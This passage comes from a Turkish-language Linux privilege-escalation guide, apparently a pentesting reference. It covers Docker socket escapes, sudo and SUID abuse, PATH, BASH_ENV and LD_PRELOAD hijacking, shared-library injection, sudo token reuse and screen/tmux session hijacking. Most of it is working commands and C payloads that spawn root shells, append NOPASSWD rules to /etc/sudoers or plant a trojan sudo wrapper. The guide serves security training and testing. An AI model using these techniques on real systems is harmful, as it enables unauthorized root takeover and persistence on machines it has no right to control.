Eğer Docker socket'e yazma erişiminiz varsa, aşağıdaki komutları kullanarak escalate privileges gerçekleştirebilirsiniz:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, host'un dosya sistemine root seviyesinde erişime sahip bir container çalıştırmanıza olanak tanır.

#### **Docker API'yi Doğrudan Kullanma**

Docker CLI kullanılamıyorsa, Docker socket hâlâ Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1.  **List Docker Images:** Mevcut görüntülerin listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Ana makinenin kök dizinini mount eden bir container oluşturmak için istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Oluşturulan container'ı başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` kullanarak container ile bağlantı kurun; bu, container içinde komut çalıştırmanıza imkan verir.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` bağlantısını kurduktan sonra, host dosya sistemine root seviyesinde erişime sahip olarak container içinde doğrudan komut çalıştırabilirsiniz.

### Diğerleri

Dikkat: docker socket üzerinde yazma izinleriniz varsa —örneğin **`docker` grubunun içindeyseniz**— [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Eğer [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) ise, onu da ele geçirebilirsiniz.

Docker'dan çıkmak veya onu istismar ederek ayrıcalıkları yükseltmenin daha fazla yolunu şurada inceleyin:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Eğer **`ctr`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun — çünkü bunu kötüye kullanarak ayrıcalıkları yükseltebilirsiniz:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Eğer **`runc`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun — çünkü bunu kötüye kullanarak ayrıcalıkları yükseltebilirsiniz:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli bir şekilde etkileşim kurmasını ve veri paylaşmasını sağlayan gelişmiş bir inter-Process Communication (IPC) sistemidir. Modern Linux sistemi düşünülerek tasarlanmış olup, farklı uygulama iletişim biçimleri için sağlam bir çerçeve sunar.

Sistem; süreçler arası veri alışverişini geliştiren temel IPC desteğinin yanı sıra, olay veya sinyal yayınlama yoluyla sistem bileşenleri arasında sorunsuz entegrasyonu destekler. Örneğin, bir Bluetooth daemon'undan gelen çağrı bildirimi bir müzik çaları sessize aldırabilir. Ayrıca D-Bus, uzak nesne sistemi desteği sağlayarak servis istekleri ve yöntem çağrılarını basitleştirir.

D-Bus, eşleşen politika kurallarının kümülatif etkisine dayanan bir **allow/deny model** ile çalışır; mesaj izinlerini (yöntem çağrıları, sinyal yayınları vb.) bu kurallar belirler. Bu politikalar, bus ile etkileşimleri tanımlar ve bu izinlerin suistimali yoluyla privilege escalation mümkün olabilir.

Örnek olarak /etc/dbus-1/system.d/wpa_supplicant.conf içindeki bir politika verilmektedir; burada root kullanıcısının fi.w1.wpa_supplicant1 üzerinde sahiplik, gönderme ve alma izinleri detaylandırılmıştır.

Belirli bir kullanıcı veya grup belirtilmemişse politikalar evrensel olarak uygulanır; "default" bağlamındaki politikalar ise diğer özel politikalar tarafından kapsanmayan tüm kullanıcılar için geçerlidir.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus iletişimini enumerate ve exploit etmeyi buradan öğrenin:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı enumerate etmek ve makinenin konumunu belirlemek her zaman ilginçtir.

### Genel enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Açık portlar

Erişmeden önce etkileşim kuramadığınız makinede çalışan ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Trafiği sniff edip edemeyeceğinizi kontrol edin. Eğer yapabilirseniz, bazı kimlik bilgilerini ele geçirebilirsiniz.
```
timeout 1 tcpdump
```
## Kullanıcılar

### Genel Keşif

Kim olduğunuzu, hangi **ayrıcalıklara** sahip olduğunuzu, sistemde hangi **kullanıcılar**ın bulunduğunu, hangilerinin **login** yapabildiğini ve hangilerinin **root ayrıcalıklarına** sahip olduğunu kontrol edin:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların ayrıcalıkları yükseltmesine izin veren bir hatadan etkilendi. Daha fazla bilgi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) ve [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** için kullanın: **`systemd-run -t /bin/bash`**

### Gruplar

Root ayrıcalıkları verebilecek bir grubun **üyesi** olup olmadığınızı kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Pano

Eğer mümkünse, panoda ilginç bir şey olup olmadığını kontrol edin.
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Ortamın herhangi bir **parolasını biliyorsanız**, parolayı kullanarak **her kullanıcı için giriş yapmayı deneyin**.

### Su Brute

Eğer çok fazla gürültü çıkarmayı umursamıyorsanız ve bilgisayarda `su` ve `timeout` ikili dosyaları bulunuyorsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcıya brute-force uygulamayı deneyebilirsiniz.\  
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresiyle kullanıcılar üzerinde brute-force yapmayı da dener.

## Yazılabilir PATH suiistimalleri

### $PATH

Eğer $PATH içindeki bazı klasörlere **yazabiliyorsanız**, yazılabilir klasörün içine farklı bir kullanıcı (ideal olarak root) tarafından çalıştırılacak bir komutun adıyla **bir backdoor oluşturup** yetkilerinizi yükseltebilirsiniz; bunun için söz konusu komutun **$PATH içinde sizin yazılabilir klasörünüzden önce yer alan bir klasörden yüklenmiyor olması** gerekir.

### SUDO ve SUID

Bazı komutları sudo ile çalıştırma izniniz olabilir veya bazı dosyaların suid biti set edilmiş olabilir. Bunu şu komutla kontrol edin:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmeyen komutlar dosyaları okuyup ve/veya yazmanıza veya hatta bir komut çalıştırmanıza izin verebilir.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının başka bir kullanıcının ayrıcalıklarıyla bir komutu parola bilmeden çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte kullanıcı `demo`, `vim`'i `root` olarak çalıştırabiliyor; artık root directory'ye bir ssh key ekleyerek veya `sh` çağırarak bir shell almak çok kolay.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge, bir şeyi çalıştırırken kullanıcıya **set an environment variable** yapma olanağı sağlar:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **based on HTB machine Admirer**, script root olarak çalıştırılırken rastgele bir python kütüphanesini yüklemek amacıyla **PYTHONPATH hijacking**'e **zayıftı:**
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

Sudoers `BASH_ENV`'i koruyorsa (ör. `Defaults env_keep+="ENV BASH_ENV"`), izin verilen bir komutu çağırırken Bash'in etkileşimli olmayan başlatma davranışından yararlanarak root olarak herhangi bir kod çalıştırabilirsiniz.

- Why it works: Etkileşimli olmayan shell'lerde, Bash `$BASH_ENV`'i değerlendirir ve hedef script'i çalıştırmadan önce o dosyayı source eder. Birçok sudo kuralı bir script'in veya bir shell wrapper'ın çalıştırılmasına izin verir. Eğer `BASH_ENV` sudo tarafından korunuyorsa, dosyanız root ayrıcalıklarıyla source edilir.

- Requirements:
- Çalıştırabileceğiniz bir sudo kuralı (etkileşimli olmayan şekilde `/bin/bash` çağıran herhangi bir hedef ya da herhangi bir bash script).
- `BASH_ENV`'in `env_keep` içinde bulunması (kontrol etmek için `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `env_keep` içinden `BASH_ENV` (ve `ENV`) çıkarın, `env_reset` tercih edin.
- sudo-izinli komutlar için shell wrappers'tan kaçının; minimal binaries kullanın.
- Korunan env değişkenleri kullanıldığında sudo için I/O kaydı ve uyarılandırmayı düşünün.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

If `sudo -l` shows `env_keep+=PATH` or a `secure_path` containing attacker-writable entries (e.g., `/home/<user>/bin`), any relative command inside the sudo-allowed target can be shadowed.

- Gereksinimler: mutlak yollar kullanılmadan komut çağıran bir script/binary çalıştıran bir sudo kuralı (genellikle `NOPASSWD`) ve önce aranan yazılabilir bir PATH girdisi (`free`, `df`, `ps`, vb. gibi komutlar mutlak yol olmadan çağrılıyor).
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo yürütme atlatma yolları
**Atlayın**: diğer dosyaları okumak için veya **symlinks** kullanın. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Eğer bir **wildcard** kullanılmışsa (\*), bu daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı Önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo komutu/SUID ikili dosyası komut yolu belirtilmeden

Eğer **sudo izni** tek bir komuta **yol belirtilmeden** verilmişse: _hacker10 ALL= (root) less_ PATH değişkenini değiştirerek bunu suistimal edebilirsiniz
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, bir **suid** binary **başka bir komutu yolunu belirtmeden çalıştırıyorsa (her zaman garip bir SUID binary'nin içeriğini** _**strings**_ **ile kontrol edin)** de kullanılabilir.

[Payload examples to execute.](payloads-to-execute.md)

### Komut yolu olan SUID binary

Eğer **suid** binary **komutun yolunu belirterek başka bir komut çalıştırıyorsa**, o halde suid dosyasının çağırdığı komutla aynı isimde bir fonksiyon oluşturup bunu **export a function** olarak dışa aktarmayı deneyebilirsiniz.

Örneğin, eğer bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa fonksiyonu oluşturup export etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Sonrasında, suid binary çağrıldığında bu fonksiyon çalıştırılacaktır.

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:

- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.

Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
Şu isimle kaydedin: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Sonra **bunu derleyin** kullanarak:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **escalate privileges** çalıştırarak
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** env değişkenini kontrol ediyorsa kötüye kullanılabilir; çünkü kütüphanelerin aranacağı yolu o kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Alışılmadık görünen **SUID** izinlerine sahip bir binary ile karşılaşıldığında, **.so** dosyalarını düzgün yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Aşağıdaki komutu çalıştırarak bunu kontrol edebilirsiniz:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hata ile karşılaşmak, istismar için bir potansiyel olduğunu gösterir.

Bunu istismar etmek için, örneğin _"/path/to/.config/libcalc.c"_ adında bir C dosyası oluşturup aşağıdaki kodu içerecek şekilde devam edilir:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlendikten ve çalıştırıldıktan sonra, dosya izinlerini değiştirerek yetkileri yükseltmeyi ve yükseltilmiş yetkilerle bir shell çalıştırmayı amaçlar.

Yukarıdaki C dosyasını bir shared object (.so) dosyasına derlemek için:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary'yi çalıştırmak exploit'i tetiklemeli ve potansiyel system compromise'a yol açmalıdır.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Artık yazabildiğimiz bir klasörden bir library yükleyen SUID binary bulduğumuza göre, gerekli isimle library'yi o klasöre oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Aşağıdaki gibi bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz kütüphanenin `a_function_name` adlı bir fonksiyon içermesi gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix ikili dosyalarının, bir saldırganın yerel güvenlik kısıtlamalarını atlatmak için suistimal edebileceği özenle derlenmiş bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) ise, bir komutta **sadece argüman enjekte edebildiğiniz** durumlar için aynıdır.

Proje, kısıtlı shell'lerden çıkmak, ayrıcalıkları yükseltmek veya sürdürmek, dosya transferi yapmak, bind ve reverse shell'ler oluşturmak ve diğer post-exploitation görevlerini kolaylaştırmak için suistimal edilebilecek Unix ikili dosyalarının meşru fonksiyonlarını toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` erişiminiz varsa, herhangi bir sudo kuralını suistimal etmenin yolunu bulup bulmadığını kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Sudo Token'larını Yeniden Kullanma

Parolasını bilmediğiniz ama **sudo erişiminiz** olduğu durumlarda, ayrıcalıkları bir sudo komutunun çalıştırılmasını bekleyip ardından oturum token'ını ele geçirerek yükseltebilirsiniz.

Ayrıcalıkları yükseltmek için gereksinimler:

- Zaten "_sampleuser_" kullanıcısı olarak bir shell'e sahipsiniz
- "_sampleuser_" son 15 dakika içinde bir şey çalıştırmak için **`sudo` kullanmış olmalıdır** (varsayılan olarak bu, parolayı tekrar girmeden `sudo` kullanmamıza izin veren sudo token süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` değeri 0 olmalıdır
- `gdb` erişilebilir olmalıdır (yükleyebilmeniz gerekebilir)

(Geçici olarak `ptrace_scope`'u `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya `/etc/sysctl.d/10-ptrace.conf` dosyasını kalıcı olarak değiştirip `kernel.yama.ptrace_scope = 0` olarak ayarlayabilirsiniz)

Eğer tüm bu gereksinimler sağlanmışsa, ayrıcalıkları şu aracı kullanarak yükseltebilirsiniz: [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Birinci exploit (`exploit.sh`) _/tmp_ içinde `activate_sudo_token` binary'sini oluşturacaktır. Bunu oturumunuzdaki sudo token'ını **aktif hale getirmek** için kullanabilirsiniz (otomatik olarak bir root shell elde etmeyeceksiniz, `sudo su` yapın):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- İkinci **exploit** (`exploit_v2.sh`) _/tmp_ içinde bir sh shell oluşturacak; bu shell **root'a ait ve setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **üçüncü exploit** (`exploit_v3.sh`) **bir sudoers file oluşturacak**; bu **sudo tokens'i kalıcı hale getirir ve tüm kullanıcıların sudo kullanmasına izin verir**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Eğer klasörde veya klasör içindeki oluşturulan dosyalardan herhangi birinde **yazma izinleriniz** varsa, ikili [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) aracını kullanarak bir kullanıcı ve PID için **sudo token** oluşturabilirsiniz.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını üzerine yazabiliyorsanız ve PID 1234 olan o kullanıcı olarak bir shell'e sahipseniz, şifreyi bilmenize gerek kalmadan **sudo ayrıcalıkları** elde edebilirsiniz şu şekilde:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Dosya `/etc/sudoers` ve `/etc/sudoers.d` içindeki dosyalar kimin `sudo` kullanabileceğini ve nasıl kullanacağını yapılandırır. Bu dosyalar **varsayılan olarak sadece user root ve group root tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız** bazı ilginç bilgiler **elde edebilirsiniz**, ve eğer herhangi bir dosyayı **yazabiliyorsanız** **escalate privileges** yapabileceksiniz.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Yazabiliyorsanız bu izni kötüye kullanabilirsiniz.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın bir başka yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` binary'e bazı alternatifler vardır; OpenBSD için `doas` bunlardan biridir. Yapılandırmasını `/etc/doas.conf`'da kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer bir **kullanıcının genellikle bir makineye bağlandığını ve `sudo` kullandığını** biliyorsanız ve o kullanıcı bağlamında bir shell elde ettiyseniz, kodunuzu root olarak çalıştıracak ve ardından kullanıcının komutunu yürütecek **yeni bir sudo yürütülebilir dosyası oluşturabilirsiniz**. Sonra, kullanıcı bağlamının **$PATH'ini değiştirin** (örneğin yeni yolu .bash_profile içinde ekleyerek) böylece kullanıcı `sudo` çalıştırdığında sizin sudo yürütülebilir dosyanız çalıştırılır.

Not: Eğer kullanıcı farklı bir shell (bash değil) kullanıyorsa yeni yolu eklemek için başka dosyaları değiştirmeniz gerekir. Örneğin[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneğini [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Ya da şu gibi bir şey çalıştırmak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

Dosya `/etc/ld.so.conf` **yüklenen yapılandırma dosyalarının nereden alındığını** belirtir. Genellikle bu dosya şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları, **kütüphanelerin** **aranacağı** **diğer klasörlere işaret eder**. Örneğin, `/etc/ld.so.conf.d/libc.conf` içeriği `/usr/local/lib`'tür. **Bu, sistemin `/usr/local/lib` içinde kütüphaneleri arayacağı anlamına gelir**.

Eğer herhangi bir nedenle belirtilen yollardan herhangi birine **bir kullanıcının yazma izni** varsa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasının gösterdiği herhangi bir klasör, yetki yükseltmesi yapabiliyor olabilir.\
Aşağıdaki sayfada **bu yanlış yapılandırmanın nasıl istismar edileceğine** bakın:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib'i `/var/tmp/flag15/` içine kopyalayarak, `RPATH` değişkeninde belirtildiği gibi program tarafından bu konumda kullanılacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ardından `/var/tmp` içine şu komutla kötü amaçlı bir kütüphane oluşturun: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetkiler

Linux yetkileri, bir sürece mevcut root ayrıcalıklarının **bir alt kümesini sağlar**. Bu, root ayrıcalıklarını **daha küçük ve ayırt edilebilir birimlere** böler. Bu birimlerin her biri daha sonra süreçlere bağımsız olarak verilebilir. Bu şekilde ayrıcalıkların tamamı azaltılarak, suistimal riskleri düşürülür.\
Aşağıdaki sayfayı okuyarak **capabilities hakkında ve bunların nasıl kötüye kullanılacağı hakkında daha fazlasını öğrenin**:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde, **"execute" biti** etkilenmiş kullanıcının "**cd**" ile klasöre girebileceğini ifade eder.\
**"read"** biti kullanıcının **dosyaları listeleyebileceğini**, ve **"write"** biti kullanıcının yeni **dosyaları silip oluşturabileceğini** belirtir.

## ACLs

Access Control Lists (ACLs), isteğe bağlı izinlerin ikincil katmanını temsil eder ve geleneksel ugo/rwx izinlerini **geçersiz kılabilecek** yetkinliktedir. Bu izinler, dosya veya dizin erişimi üzerinde sahip olmayan veya grup üyesi olmayan belirli kullanıcılara hak tanıyarak veya reddederek daha fazla kontrol sağlar. Bu düzeydeki **ince ayrıntı, daha hassas erişim yönetimi sağlar**. Daha fazla ayrıntı için [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Ver** kullanıcı "kali"ye bir dosya üzerinde okuma ve yazma izinleri:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Al** sistemden belirli ACL'lere sahip dosyaları:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Açık shell oturumları

**Eski sürümlerde** farklı bir kullanıcının (**root**) bazı **shell** oturumlarını **hijack** edebilirsiniz.\
**En yeni sürümlerde** sadece **kendi kullanıcınızın** **screen** oturumlarına **connect** olabileceksiniz. Ancak oturum içinde **ilginç bilgiler** bulabilirsiniz.

### screen oturumları hijacking

**screen oturumlarını listele**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Session'a bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu, **eski tmux sürümleri** ile ilgili bir sorundu. root tarafından oluşturulan bir tmux (v2.1) oturumunu ayrıcalıksız bir kullanıcı olarak hijack edemedim.

**tmux oturumlarını listele**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Bir oturuma bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
